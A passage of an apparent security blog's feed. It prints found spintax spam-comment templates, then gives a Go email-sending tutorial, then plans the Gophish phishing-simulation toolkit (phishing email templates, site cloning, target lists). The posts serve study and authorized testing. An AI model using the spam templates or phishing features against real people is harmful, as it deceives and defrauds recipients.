-<p><em>As a side note, the scripts were bundled as some Louis Vuitton spam, though that doesn&rsquo;t seem to relate to the content of the spam scripts at all.</em></p>
-
-<h3>The Spam Scripts</h3>
-
-<p>Here are the scripts &ndash; the format looks very similar to <a href="http://alexking.org/blog/2013/12/22/spam-comment-generator-script">those found by Alex King</a>. I&rsquo;m guessing that one choice from each <code>{block}</code> is used at random to make every comment unique.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>{Rapper|Rap artist|Artist} {George|Henry} Watsky apologises {for|with regard to|regarding|pertaining to} {breaking|busting|splitting|smashing} {woman|lady|girl|female}
-</span><span class='line'>{The|The actual|The particular|Your} {rapper|rap artist|artist} {was|had been|has been|ended up being} {performing|carrying out|executing|undertaking} {at|from|with|in} Alexandra {Palace|Structure|Construction|Development} {in|within|inside|throughout} {north|northern|n .|upper} {London|Birmingham|Greater london|Manchester} {when he|as he|while he|whilst} {climbed|rose|risen|soared} {up the|in the|the|inside the} {stage|phase|period|point} {on a|on the|over a|with a} {rope|string|piece of string|line} {before|prior to|just before|ahead of} {launching|starting|introducing|establishing} {himself|themself|themselves|herself} {onto the|to the|on the|on top of the} {audience|target audience|viewers|market} {from|through|coming from|via} 30ft.
-</span><span class='line'>{In a|Inside a|In the|Within a} {lengthy|extended|prolonged|long} {post|publish|submit|article} {on|upon|about|in} {his|their|his / her|his or her} {Facebook|Fb|Myspace|Facebook or myspace} {page|web page|site|web site}, Watsky apologised {for|with regard to|regarding|pertaining to} {his|their|his / her|his or her} {stunt|stop|trick} {and|as well as|and also|along with} {said|stated|mentioned|explained} {he|he or she|this individual|they} {decided to|chose to|made a decision to|thought we would} {jump|leap|hop|bounce} {due to a|as a result of|because of a|because of} "huge overreach {in the|within the|inside the|from the} {heat|warmth|temperature|high temperature} {of the|from the|with the|in the} moment".
-</span><span class='line'>{He said|He explained|He was quoted saying|He stated}: "The {jump|leap|hop|bounce} {was not|wasn't|had not been|has not been} {awesome|amazing|great|wonderful}, {it was not|it wasn't|it had not been} badass, {and it|also it|plus it|and yes it} {was not|wasn't|had not been|has not been} ballsy. {It|This|That|The idea} {turned|switched|flipped|transformed} {what|exactly what|just what|precisely what} {should have|must have|needs to have|really should have} {been|already been|recently been|been recently} {a great|an excellent|a fantastic|an incredible} {day|day time|evening|morning} {for the people|for anyone|for those|for people} {who|that|which|whom} {got|obtained|received|acquired} {hurt|harm|damage|injure} {into a|right into a|in to a|in a} {nightmare|headache|problem|pain}. {It was|It had been|It absolutely was|It turned out} {stupid|silly|foolish|ridiculous} {and|as well as|and also|along with} {wildly|extremely|hugely|very} {irresponsible|reckless|uncaring|freewheeling}, {plain and simple|basically|in basic terms|simply}.
-</span><span class='line'>"I {pride|satisfaction|delight|pleasure} {myself|personally|me personally|myself personally} {on|upon|about|in} {trying to|attempting to|wanting to|looking to} {put on|placed on|wear|place on} {a good|a great|an excellent|a fantastic} {show|display|present|demonstrate} {and always|and try to|and constantly|try to} {giving|providing|offering|supplying} {100|One hundred|A hundred|Hundred} {per cent|percent|%|per-cent} {energy|power|vitality|electricity}, {but|however|yet|nevertheless} {jumping|leaping|bouncing|moving} {off|away|away from|off of} {some|a few|several|a number of} {high|higher|large|substantial} {st|street|saint|e} {doesn't|does not|will not|won't} {make|help to make|help make|create} {someone|somebody|an individual|a person} {a good|a great|an excellent|a fantastic} {musician|music performer|artist|musician and performer} {or|or even|or perhaps|as well as} {performer|artist|musician|singer}. {I feel|Personally i think|I'm|I am} fing {terrible|horrible|awful|dreadful}. {I|We|My partner and i|My spouse and i} {made a|designed a|developed a|created a} boneheaded {decision|choice|selection|determination} {that|which|in which|that will} {got|obtained|received|acquired} {people|individuals|folks|men and women} {hurt|harm|damage|injure}, {and it's|and it is|and it's really|and} {extremely|very|really|incredibly} {lucky|fortunate|blessed|fortuitous} {it wasn't|it had not been|it was not} {worse|even worse|a whole lot worse|more serious}.{"|Inch|Inches|In .}
-</span><span class='line'>{He|He or she|This individual|They} {added|additional|extra|included} {he|he or she|this individual|they} {was not|wasn't|had not been|has not been} {under the influence of|intoxicated by|consuming|ingesting} {drugs or alcohol|alcohol or drugs} {when he|as he|while he|whilst} {performed|carried out|done|executed} {the|the actual|the particular|your} {stunt|stop|trick}, {and|as well as|and also|along with} {said|stated|mentioned|explained} {his|their|his / her|his or her} {health|wellness|well being|wellbeing} {was|had been|has been|ended up being} "fine, {besides|apart from|in addition to|aside from} {some|a few|several|a number of} {nicks|grazes|dings|lacerations}, bruises, {and the|and also the|as well as the|along with the} {shame|pity|disgrace|waste} {of|associated with|regarding|involving} {endangering|risking|threatening} {the|the actual|the particular|your} crowd".
-</span><span class='line'>{The|The actual|The particular|Your} {Californian|American} {rapper|rap artist|artist} {said|stated|mentioned|explained} {he had|he'd|he previously|he} {been to|visited|gone to|attended} {hospital|medical center|clinic|healthcare facility} {to visit|to go to|to see|to check out} {the two|the 2|both|both the} {audience|target audience|viewers|market} {members|people|associates|users} {who were|who have been|who had been|have been} {injured|hurt|wounded|harmed}, {and|as well as|and also|along with} {stayed|remained|stayed at|slept} {with them|together|using them|with these} {for|with regard to|regarding|pertaining to} {six hours|6 hours} {until the|before the|before|prior to the} {visiting|going to|browsing|traveling to} {period|time period|period of time|interval} {had|experienced|acquired|got} {ended|finished|concluded|broken}.
-</span><span class='line'>{He|He or she|This individual|They} {confirmed|verified|established|validated} {he would|he'd|however|although} {not be|'t be|not|stop} {cancelling|rescheduling|deleting|closing} {his|their|his / her|his or her} {remaining|leftover|staying|outstanding} {six|6|half a dozen|six to eight} {tour|visit|excursion|trip} {dates|times|days|schedules} {in the UK|in the united kingdom|in britain|in england}.
-</span><span class='line'>"I {will do|is going to do|can do|will perform} {the|the actual|the particular|your} {shows|exhibits|displays|demonstrates}, {as usual|as always} {I will|I'll|I am going to|Let me} {meet|fulfill|satisfy|meet up with} {everyone|everybody|every person|anyone} {afterwards|later on|soon after|after}, {and I will|and i'll} {NOT be|'t be|Not|Stop} {jumping|leaping|bouncing|moving} {off|away|away from|off of} {anything|something|anything at all|everything}. {I am|I'm|I will be|We are} {deeply|seriously|profoundly|significantly} {sorry|i'm sorry|remorseful|i am sorry} {and I|and that i|and i also|i} {promise|guarantee|assure|offer} {to learn|to understand|to find out|to master} {from this|out of this|using this|because of this} {mistake|error|blunder|oversight},{"|Inch|Inches|In .} {he said|he explained|he was quoted saying|he stated}./p&gt;
-</span><span class='line'>
-</span><span class='line'>{Police|Law enforcement|Law enforcement officials|Authorities} {find|discover|locate|uncover} {2|Two|A couple of|Only two} {more|much more|a lot more|far more} corpses {in|within|inside|throughout} Surrey
-</span><span class='line'>Sgt. {PT|Rehabilitation|Therapist} Wednesdayinan {area of|section of|part of|division of} {South|Southern|To the south|Southerly} Surrey {that has been|that's been|which has been|that is} {used|utilized|employed|utilised} {twice|two times|2 times|double} {this year|this season|this coming year|in 2010} {as a|like a|being a|as being a} {dumping ground|drop zone} {for|with regard to|regarding|pertaining to} {bodies|physiques|body|systems}.{The|The actual|The particular|Your} {integrated|incorporated|built-in|included} {homicide|murder|killing|kill} {investigation|analysis|study|exploration} {team|group|staff|crew} {was|had been|has been|ended up being} {called|known as|referred to as|named} {Wednesday|Thursday|Friday|Wed} {morning|early morning|morning hours|day} {to an|for an|to a|with an} {area of|section of|part of|division of} Colebrook {Road|Street|Highway|Path} {in|within|inside|throughout} Surrey {that has become|that is|that has been|this is certainly} {a|the|any|a new} {dumping ground|drop zone} {for|with regard to|regarding|pertaining to} {bodies|physiques|body|systems}. (CBC){More|Much more|A lot more|Far more} {police|law enforcement|law enforcement officials|authorities} {were|had been|have been|ended up} {then|after that|next|and then} {called in|contacted|called}, {and a|along with a|plus a|as well as a} {police|law enforcement|law enforcement officials|authorities} {dog|canine|puppy|pet} {team|group|staff|crew} {located|situated|positioned|found} {a woman's|a ladies|a lady's|a female's} {body|physique|entire body|system} {as well|too|also|at the same time} {a short distance|ten or twenty yards} {away|aside|absent|apart}.{Pound|Lb|Single pound|Lb .} {said|stated|mentioned|explained} {both|each|equally|the two} {victims|sufferers|patients|subjects} {appeared to|seemed to|did actually|gave the impression to} {have|possess|have got|get} {met|fulfilled|satisfied|achieved} {with|along with|together with|using} {foul|bad|nasty|strong} {play|perform|enjoy|participate in}. {Police have|Mother and father|Weed|Cannabis} {not yet been|not|to be} {able to|in a position to|capable of|capable to} {identify|determine|recognize|discover} {them|all of them|these|these people}."Until {the|the actual|the particular|your} {identity|identification|id|personality} {has been|continues to be|may be|has become} {determined|established|decided|identified}, {investigators|detectives|researchers|private investigators} {will not|won't|is not going to|will not likely} {know the|be aware of|understand the|have in mind the} {connection|link|relationship|interconnection}, {if any|or no}, {today's|present day|the current|modern day} {victims|sufferers|patients|subjects} {have to|need to|must|ought to} {each other|one another|the other person|the other} {or to|in order to|or|as well as to} {the other|another|one other|the opposite} {two|2|a couple of|a pair of} {victims|sufferers|patients|subjects} {found|discovered|identified|located} {recently|lately|not too long ago|just lately} {in this area|in this region|in this field|of this type},{"|Inch|Inches|In .} {Pound|Lb|Single pound|Lb .} {said|stated|mentioned|explained} {in a|inside a|in the|within a} {written|created|composed|published} {statement|declaration|assertion|affirmation}.{2|Two|A couple of|Only two} {bodies|physiques|body|systems} foundearlier {in|within|inside|throughout} 2013IHIT {investigators|detectives|researchers|private investigators} {were|had been|have been|ended up} {already|currently|previously|by now} {called|known as|referred to as|named} {out|away|out there|out and about} {twice|two times|2 times|double} {this year|this season|this coming year|in 2010} {to|in order to|to be able to|for you to} Colebrook {Road|Street|Highway|Path}, {a remote|an online|an isolated|a secluded} {rural|non-urban|countryside|outlying} {stretch|extend|stretch out|expand} {near the|close to the|nearby the|at the} {Serpentine|Courbe} {River|Water|Lake|Pond}, {south|southern|to the south|southerly} {of the|from the|with the|in the} {Panorama|Surroundings|Vista} {Ridge|Form|Shape|Rdg} {neighbourhood|area|local community|community} andnorth {of|associated with|regarding|involving} {Mud|Dirt|Off-road|Will get} {Bay|These types of|Fresh|These kinds of}.Colebrook {Road|Street|Highway|Path} {and|as well as|and also|along with} 125A StreetIn {February|Feb|Feb .|January}, abadly {burned|burnt|used up|burned up} {body|physique|entire body|system} {was found|was discovered|is discovered} {off|away|away from|off of} Colebrook Roadnear 125th {Street|Road|Avenue|Block}. Policeidentified {that|which|in which|that will} {victim|target|sufferer|prey} {as|because|since|while} {29|Twenty nine|30|28} {year old|years old|yr old|year-old} Amritpal Saran, {of|associated with|regarding|involving} Delta. {Police|Law enforcement|Law enforcement officials|Authorities} {said|stated|mentioned|explained} {the man|the person|the guy|he} {was|had been|has been|ended up being} {known to|recognized to|proven to|seen to} {them|all of them|these|these people}, {but|however|yet|nevertheless} {had no|didn't have|didn't have any|did not have any} {known|recognized|identified|acknowledged} {gang|bunch|team|company} {affiliations|organizations|connections|links}.{Police|Law enforcement|Law enforcement officials|Authorities} {were|had been|have been|ended up} {also called|also known as|also referred to as|otherwise known as} {to|in order to|to be able to|for you to} investigatea {violent|chaotic|severe|crazy} {attack|assault|strike|invasion} {on a|on the|over a|with a} Surrey {sex|intercourse|sexual intercourse|making love} {trade|industry|business|buy and sell} {worker|employee|member of staff|staff member} {along|together|alongside|coupled} Colebrook {Road|Street|Highway|Path} {in|within|inside|throughout} {October|Oct|March|April}.{In|Within|Inside|Throughout} {February|Feb|Feb .|January}, {police|law enforcement|law enforcement officials|authorities} {released|launched|introduced|unveiled} {sketches|drawings|paintings|images} {of|associated with|regarding|involving} {two|2|a couple of|a pair of} {South|Southern|To the south|Southerly} {Asian|Oriental|Hard anodized cookware|Cookware} menwho allegedlydrove {her|the woman's|the girl|your ex} toColebrook {Road|Street|Highway|Path} {near|close to|around|in close proximity to} 128th {Street|Road|Avenue|Block}, {and|as well as|and also|along with} {physically|bodily|actually|literally} {and|as well as|and also|along with} {sexually|while making love|intimately|in the bedroom} {assaulted|attacked|bombarded|mauled} {her|the woman's|the girl|your ex}. {She|The lady|Your woman|The girl} {was|had been|has been|ended up being} {taken to|come to|taken up|delivered to} {hospital|medical center|clinic|healthcare facility} {with|along with|together with|using} {serious|severe|significant|critical} {injuries|accidents|accidental injuries|incidents}.
-</span><span class='line'>
-</span><span class='line'>{Pressure|Stress|Strain|Force} {rating|score|ranking|standing} {for 3|for several}
-</span><span class='line'>{Check out|Take a look at|Have a look at|Look at} {some|a few|several|a number of} {similar|comparable|related|equivalent} {questions|concerns|queries|inquiries}!
-</span><span class='line'>{How can I|How do i|How could i|How to} {reduce|decrease|lessen|minimize} {a|the|any|a new} 4" {cast iron|surefire|certain|iron} {pipe|water pipe|tube|water line} {opening|starting|beginning|opening up} {to|in order to|to be able to|for you to} 2" {pvc|pvc material|faux wood|imitation wood} pipe&gt; [ {2|Two|A couple of|Only two} {Answers|Solutions|Responses|Replies} {]|}
-</span><span class='line'>{The last|The final|The past|The very last} {owner|proprietor|operator|seller} {put a|place a|convey a} 2' {pvc|pvc material|faux wood|imitation wood} {pipe|water pipe|tube|water line} {into a|right into a|in to a|in a} 4" {cast iron|surefire|certain|iron} {opening|starting|beginning|opening up}   {it looks like|it appears as though|it appears like|it appears as if} {they just|they simply|they only|they merely} {filled|stuffed|crammed|loaded} {the opening|the outlet} {with|along with|together with|using} {plumbers|local plumbers|plumbing technicians|plumbing engineers} putty   {i am|i'm|i will be|we are} {looking to|seeking to|trying to|planning to} {repair it|do the repair|correct it|remedy it} {properly|correctly|effectively|appropriately}   {what can|so what can|exactly what can|exactly what do} {I use|I personally use|I take advantage of|I prefer} {to go into|to enter|to penetrate|to get in} {the|the actual|the particular|your} {cast iron|surefire|certain|iron} 4"opening {to reduce|to lessen|to cut back|to scale back} {it|this|that|the idea} {to|in order to|to be able to|for you to} 2" {opening|starting|beginning|opening up} {which I|that we|that i|i} {can then|may then|are able to|will then} {attach|connect|affix|add} {3|Three|Several|Three or more}? {Thank you|Thanks|Many thanks|Thanks a lot}
-</span><span class='line'>{Replace|Substitute|Change|Exchange} 3" {ABS|Ab muscles|Abdominal muscles|Stomach muscles} {pipe|water pipe|tube|water line} {bonded|glued|fused|insured} {into|in to|directly into|straight into} {cast iron|surefire|certain|iron} cleanout {pipe|water pipe|tube|water line} [ {1|One|A single|One particular} {Answers|Solutions|Responses|Replies} {]|}
-</span><span class='line'>{Need to|Have to|Must|Should} {connect|link|hook up|join} {new|brand new|fresh|brand-new} 3" {ABS|Ab muscles|Abdominal muscles|Stomach muscles} {pipe|water pipe|tube|water line} {to an|for an|to a|with an} {old|aged|outdated|previous} {cast iron|surefire|certain|iron} cleanout {pipe|water pipe|tube|water line} {just|simply|merely|only} {above|over|previously mentioned|earlier mentioned} {cement|concrete|bare concrete|bare cement} {floor|ground|flooring|floorboards}. {Need to|Have to|Must|Should} {create a|produce a|develop a|build a} {new|brand new|fresh|brand-new} cleanout {in|within|inside|throughout} 3" {ABS|Ab muscles|Abdominal muscles|Stomach muscles} {that will be|that'll be|which will be|that is to be} 12" {above the|over the|across the|higher than the} {old|aged|outdated|previous} {cast iron|surefire|certain|iron} cleanout {so that|to ensure that|in order that|to ensure} {a main|a primary|a principal|an important} {sewer line|sewage} {blockage|obstruction|congestion|clog} {between the|between your|involving the|relating to the} {main|primary|principal|major} {stack|bunch|collection|pile} {the street|the road|the trail|the path} {sewer|sewer line|sewage} {some|a few|several|a number of} {25|Twenty five|Twenty-five|30} {feet|ft|toes|foot} {away|aside|absent|apart} {can be removed|can be taken off|is easy to remove|are easy to remove}. {Had to|Needed to|Were required to|Was required to}.
-</span><span class='line'>{For|With regard to|Regarding|Pertaining to} {600|Six hundred|Six-hundred|1000} {rating|score|ranking|standing} {pipe|water pipe|tube|water line} {what is the|what's the|is there a|exactly what is the} {schedule|routine|timetable|plan} {require|need|call for|demand} {for|with regard to|regarding|pertaining to} 2" NB {pipe|water pipe|tube|water line} [ {0|Zero|2|3} {Answers|Solutions|Responses|Replies} {]|}
-</span><span class='line'>{Capacity|Capability|Ability|Potential} {of|associated with|regarding|involving} 6" {schedule|routine|timetable|plan} {40|Forty|45|Forty five} {pipe|water pipe|tube|water line} {at|from|with|in} {3|Three|Several|Three or more} {psi|pounds per square inch}. {Natural gas|Gas|Propane|Gas main} {pressure|stress|strain|force} [ {1|One|A single|One particular} {Answers|Solutions|Responses|Replies} {]|}
-</span><span class='line'>{Capacity|Capability|Ability|Potential} {of|associated with|regarding|involving} 6" {schedule|routine|timetable|plan} {40|Forty|45|Forty five} {pipe|water pipe|tube|water line} {at|from|with|in} {3|Three|Several|Three or more} {psi|pounds per square inch}. {And|As well as|And also|Along with}, {where can I|how can i|can anyone help me|i'm looking to} {find a|look for a|locate a|discover a} {pressure|stress|strain|force} {table|desk|stand|kitchen table} {for|with regard to|regarding|pertaining to} {capacities|capabilities|sizes|drives} {of various|of numerous|of varied|of assorted} {size|dimension|dimensions|measurement} {pipes|plumbing|water lines|piping} {at|from|with|in} {various|numerous|different|a variety of} {inlet|intake|inlt} {pressures|demands|challenges|difficulties}
-</span><span class='line'>{Adding|Including|Incorporating|Introducing} {a|the|any|a new} {PVC|Pvc material|Faux wood|Imitation wood} "Y" {to a|to some|with a|into a} {underground|subterranean|undercover|subway} {Cast iron|Surefire|Certain|Iron} {pipe|water pipe|tube|water line} [ {1|One|A single|One particular} {Answers|Solutions|Responses|Replies} {]|}
-</span><span class='line'>{I have a|I've got a|I've a|I own a} {house|home|residence|property} {built in|built-in|integrated|internal} {1962|'62}. {The|The actual|The particular|Your} {cast iron|surefire|certain|iron} {waste|squander|waste materials|spend} {pipe|water pipe|tube|water line} {runs|operates|works|goes} {under the|underneath the|beneath the|within the} {concrete slab|layer of concrete} {in the|within the|inside the|from the} {basement|cellar|downstairs room|attic}. {I have|I've|We have|We've} {already|currently|previously|by now} {dug|made|excavated|finished} {and|as well as|and also|along with} {confirmed|verified|established|validated} {the location|the place|the positioning|the venue} {I want to|I wish to|I would like to|I must} {cut|reduce|minimize|lower} {a section|a piece|an area|a bit} {out of the|from the|out from the|out of your} {pipe|water pipe|tube|water line} {and|as well as|and also|along with} {install a|use a|put in a|purchase a} "Y" {connector|connection|plug} {and|as well as|and also|along with} {run|operate|work|manage} {new|brand new|fresh|brand-new} {plastic|plastic material|plastic-type|plastic-type material} {waste|squander|waste materials|spend} {pipes|plumbing|water lines|piping} {to a new|to a different|to an alternative|completely to another} {bath|bathtub|shower|bath tub}. {I have seen|I've come across|I have come across|I know of} {PVC|Pvc material|Faux wood|Imitation wood} {connectors|fittings|connections|band} {that|which|in which|that will}./p&gt;</span></code></pre></td></tr></table></div></figure>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Building GoPhish - How to Send Email with Go]]></title>
-    <link href="http://jordan-wright.github.io/blog/2014/01/03/building-gophish-how-to-send-email-with-go/"/>
-    <updated>2014-01-03T22:06:00-06:00</updated>
-    <id>http://jordan-wright.github.io/blog/2014/01/03/building-gophish-how-to-send-email-with-go</id>
-    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/go_email.png"/></p>
-
-<h3>Introduction</h3>
-
-<p>I&rsquo;ve been playing around with Go for about a month now, and I&rsquo;ve <em>really</em> grown to like it. After getting used to the syntax and remembering what a pointer is for (thanks, Python), Go has become a favorite language to develop with. I&rsquo;m even using it for the <a href="http://www.matasano.com/articles/crypto-challenges/">Matasano Crypto Challenges</a> (which are <em>awesome</em>).</p>
-
-<p>While the standard library in Go is definitely robust, being a young language, there are a few niceties that aren&rsquo;t yet included. Sending email is one of them. Don&rsquo;t get me wrong, Go has a wonderful <a href="http://golang.org/pkg/net/smtp/">SMTP</a> package, <a href="http://golang.org/pkg/mime/">MIME</a> package, and even a <a href="http://golang.org/pkg/net/mail/">Mail</a> package (which <em>only</em> parses existing email messages). However, there is no library to actually <strong>create</strong> emails in a meaningful way. Since <a href="https://github.com/jordan-wright/gophish">Gophish</a> relies heavily on sending emails, I&rsquo;ve sought to change this. And, after reading more RFC&rsquo;s than I normally prefer, I believe I&rsquo;ve created a package that provides intuitive, robust, and flexible email creation and sending called <a href="https://github.com/jordan-wright/email">email</a>.</p>
-
-<p>Let&rsquo;s see how to use it.</p>
-
-<!--more-->
-
-
-<h3>How You <em>Normally</em> Send an Email in Go</h3>
-
-<p>To send email in Go, one needs to:</p>
-
-<ul>
-<li>Create a byte slice of the email message (conforming to all needed RFC&rsquo;s)</li>
-<li>Send this email using the SMTP library</li>
-</ul>
-
-
-<p>The second part is easy, the first part is not. Sure, sending a simple text message may be straight forward, but things get tricky when you want to cover things like supporting HTML and text body types, attaching files, supporting CC and BCC recipients, etc.</p>
-
-<h3>Sending Email Using the <code>email</code> Package</h3>
-
-<p>To make this easier, I have created the <a href="https://github.com/jordan-wright/email"><code>email</code></a> package (full documentation <a href="http://godoc.org/github.com/jordan-wright/email">here</a>). This package allows users to create emails with a variety of options, and send them easily. Examples say more than I can, so here is some code showing how to use the package.</p>
-
-<h4>Installing the Package</h4>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>go get github.com/jordan-wright/email</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Creating a New Email</h4>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kn">package</span> <span class="nx">main</span>
-</span><span class='line'>
-</span><span class='line'><span class="kn">import</span> <span class="s">&quot;github.com/jordan-wright/email&quot;</span>
-</span><span class='line'>
-</span><span class='line'><span class="kd">func</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
-</span><span class='line'>  <span class="nx">e</span> <span class="o">:=</span> <span class="nx">email</span><span class="p">.</span><span class="nx">NewEmail</span><span class="p">()</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Setting the Subject, To, From, Bcc, Cc</h4>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">Subject</span> <span class="p">=</span> <span class="s">&quot;Awesome Subject&quot;</span>
-</span><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">From</span> <span class="p">=</span> <span class="s">&quot;Jordan Wright &lt;test@gmail.com&gt;&quot;</span>
-</span><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">To</span> <span class="p">=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">&quot;test@example.com&quot;</span><span class="p">}</span>
-</span><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">Bcc</span> <span class="p">=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">&quot;test_bcc@example.com&quot;</span><span class="p">}</span>
-</span><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">Cc</span> <span class="p">=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">&quot;test_cc@example.com&quot;</span><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Setting the Content (HTML &amp; Text)</h4>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">Text</span> <span class="p">=</span> <span class="s">&quot;Text Body is, of course, supported!&quot;</span>
-</span><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">HTML</span> <span class="p">=</span> <span class="s">&quot;&lt;h1&gt;Fancy Html is supported, too!&lt;/h1&gt;&quot;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Attaching a File</h4>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">AttachFile</span><span class="p">(</span><span class="s">&quot;test.txt&quot;</span><span class="p">)</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>You can also use the <a href="http://godoc.org/github.com/jordan-wright/email#Email.Attach"><code>Attach</code></a> function to attach content directly from an io.Reader.</p>
-
-<h4>Sending the Email (Using Gmail as Example)</h4>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">Send</span><span class="p">(</span><span class="s">&quot;smtp.gmail.com:587&quot;</span><span class="p">,</span> <span class="nx">smtp</span><span class="p">.</span><span class="nx">PlainAuth</span><span class="p">(</span><span class="s">&quot;&quot;</span><span class="p">,</span> <span class="s">&quot;test@gmail.com&quot;</span><span class="p">,</span> <span class="s">&quot;password123&quot;</span><span class="p">,</span> <span class="s">&quot;smtp.gmail.com&quot;</span><span class="p">))</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Conclusion</h4>
-
-<p>I hope this package will be useful to those that need to send email from their Go projects. I am excited to continue working on Gophish &ndash; you can expect a big update soon! Until then, as always, feel free to leave any questions or comments below.</p>
-
-<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Building Gophish - Day 1]]></title>
-    <link href="http://jordan-wright.github.io/blog/2013/11/29/building-gophish-day-1/"/>
-    <updated>2013-11-29T16:15:00-06:00</updated>
-    <id>http://jordan-wright.github.io/blog/2013/11/29/building-gophish-day-1</id>
-    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/gophish.png"/></p>
-
-<h3>Introduction</h3>
-
-<p>Since the <a href="http://sptoolkit.com/the_end.php">Simple Phishing Toolkit (SPT)</a> was discontinued, I&rsquo;ve wanted to create a simple, effective, and open-source phishing toolkit. In recent years, we&rsquo;ve seen a rise in spear-phishing attacks targeting large organizations, most of which are largely successful. The goal of this toolkit will be to provide businesses and penetration testers with the ability to quickly and easily perform in-house or contracted phishing engagements, and track the responses to see where improvements can be made. This toolkit will be called <a href="https://github.com/jordan-wright/gophish">gophish</a>.</p>
-
-<p>In addition to this, I&rsquo;ve been casually poking around at <a href="http://golang.org/"><code>go</code></a> for a while now, and have decided it would be good to finally put it to use in a larger project. I&rsquo;m a fan of seeing the steady development and updates of projects as they are created. I believe it can help keep the developer motivated and the users informed and involved, so this is what I&rsquo;m going to do. Hopefully, these posts will allow others to learn alongside me, as well as spur improvements from experienced <code>go</code> developers so that <a href="https://github.com/jordan-wright/gophish">gophish</a> can be the best product possible.</p>
-
-<p>With that being said &ndash; let&rsquo;s get started!</p>
-
-<!--more-->
-
-
-<h3>Why Go?</h3>
-
-<p>In addition to learning a new language, here are a few reasons why I chose <code>go</code> for this project:</p>
-
-<ul>
-<li>Cross-compile binaries by default</li>
-<li>Only distribute one binary &ndash; just download and run (no more dependencies!)</li>
-<li>Low memory overhead</li>
-</ul>
-
-
-<p>I believe the second point is crucial, in that it makes it <em>dead-simple</em> to get up and running. Existing solutions (such as SPT or <a href="https://github.com/pentestgeek/phishing-frenzy">Phishing Frenzy</a>) require an already running webserver or other framework installation.</p>
-
-<h3>Gophish Requirements</h3>
-
-<p>Here are a few of the things I want to be able to do with gophish:</p>
-
-<ul>
-<li>Create &ldquo;campaigns&rdquo;, each of which are a simulation of a phishing attack</li>
-<li>Create HTML or text templates for phishing emails, providing as many as possible built-in</li>
-<li>Allow users to clone existing sites for use in templates</li>
-<li>Allow users to import and group phishing targets easily</li>
-<li>Provide intuitive analytics, and allow reports to be exported</li>
-<li>If possible, integrate with existing products such as the Social Engineer&rsquo;s Toolkit</li>
-</ul>
-
-
-<h3>Getting Started</h3>
-
-<p>I am <em>tentatively</em> planning on creating a REST API for all backend functionality, so as to allow developers to automate gophish. This will also make it easier to separate front-end logic from the backend.</p>
-
-<p>I have looked around at different <code>go</code> web frameworks, and I am going to start by taking a look at the tools provided in the <a href="http://www.gorillatoolkit.org/">Gorilla toolkit</a>, since they seem to sit on top of the standard <code>net/http</code> library without abstracting too many things away.</p>
-
-<p>That&rsquo;s all I have for now &ndash; stay tuned for progress updates (and a big initial commit)! And, as always, let me know if you have any questions or suggestions in the comments below!</p>
-
-<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
